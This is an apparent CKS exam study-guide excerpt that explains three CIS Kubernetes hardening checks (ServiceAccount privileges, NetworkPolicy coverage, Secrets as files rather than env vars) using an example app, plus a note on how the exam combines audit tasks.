5.2.1Ensure that ServiceAccounts do not have cluster-adminServiceAccounts are for pod identity, not human access. They should never have admin.anihpj's SA should only have RBAC to its own namespace — nothing more.
5.3.1Ensure NetworkPolicy exists in every namespaceWithout NetworkPolicy, every pod can reach every other pod — including cross-namespace.Without NetworkPolicy in the anihpj namespace, a compromised pod can reach postgres directly.
5.4.1Ensure Secrets are not used as environment variablesEnv vars are exposed in /proc, in crash logs, in kubectl describe output.anihpj's SECRET_KEY and DATABASE_URL must be mounted as files, not env vars.

Exam pattern: The CKS exam frequently combines these checks into a single task: "Audit the cluster for unnecessary components and insecure configurations. Remove or fix them." This means running through the checklist, identifying issues, and applying the fixes — all within the exam time limit. The more you practice this workflow, the faster you will complete these tasks.
